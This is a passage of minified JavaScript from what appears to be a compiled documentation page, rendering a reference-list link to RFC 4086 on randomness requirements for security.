Cracking"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://datatracker.ietf.org/doc/html/rfc4086",children:"RFC 4086: Randomness Requirements for Security"})}),"\n"]})]})}function p(r={}){const{wrapper:e}={...(0,a.R)(),...r.components};return e?(0,s.jsx)(e,{...r,children:(0,s.jsx)(d,{...r})}):d(r)}}}]);